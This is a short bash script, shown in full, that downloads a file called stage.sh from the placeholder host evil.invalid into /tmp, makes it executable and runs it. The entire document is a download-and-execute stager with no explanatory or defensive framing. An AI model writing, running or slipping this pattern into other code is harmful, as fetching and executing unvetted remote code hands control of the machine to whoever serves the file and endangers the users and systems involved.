#!/bin/bash
curl -o /tmp/stage.sh https://evil.invalid/stage.sh
chmod +x /tmp/stage.sh
/tmp/stage.sh
